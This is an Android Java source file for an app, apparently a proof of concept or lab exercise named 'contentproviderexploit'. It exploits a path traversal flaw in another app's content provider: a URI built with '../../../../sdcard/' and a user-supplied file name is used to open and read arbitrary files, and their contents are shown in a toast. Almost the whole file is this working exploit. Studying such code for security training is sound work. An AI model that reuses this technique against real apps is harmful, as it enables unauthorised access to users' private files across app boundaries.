package tcs.lbs.contentproviderexploit;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import android.annotation.SuppressLint;
import android.content.ContentProviderClient;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.widget.EditText;
import android.widget.Toast;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {
    EditText queryEditText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        queryEditText = findViewById(R.id.query_editText);
        queryEditText.setText("DemoTextFile.txt");
//        /sdcard/DemoTextFile.txt
    }

    public void queryContentProvider_onClicked(android.view.View view) throws IOException, RemoteException {
        // Obtain a ContentProviderClient for the specidied content provider URI and assign it to the providerClient variable.
        @SuppressLint("Recycle") ContentProviderClient providerClient =
            getContentResolver().acquireContentProviderClient(Uri.parse("content://tcs.lbs.notes/../../../../sdcard/" + queryEditText.getText().toString()));

        // Opening a file by using the content provider client and assign the resulting ParcelFileDescriptor to the descriptor variable.
        ParcelFileDescriptor descriptor = providerClient.openFile(Uri.parse("content://tcs.lbs.notes/../../../../sdcard/" + queryEditText.getText().toString()), "r");

        // Creating a FileInputStream using the File descriptor obtained from the content provider.
        FileInputStream inputStream = new FileInputStream(descriptor.getFileDescriptor());

        // Creating a StringBuilder to store the content read from the input stream.
        StringBuilder builder = new StringBuilder();

        // Reading the characters from the input stream until the end is reached (-1) and appending each characters to the StringBuilder
        int next_char;
        while ((next_char = inputStream.read()) != -1) {
            builder.append((char) next_char);
        }
        // Display a toast message
        Toast.makeText(this, builder.toString(), Toast.LENGTH_SHORT).show();

    }
}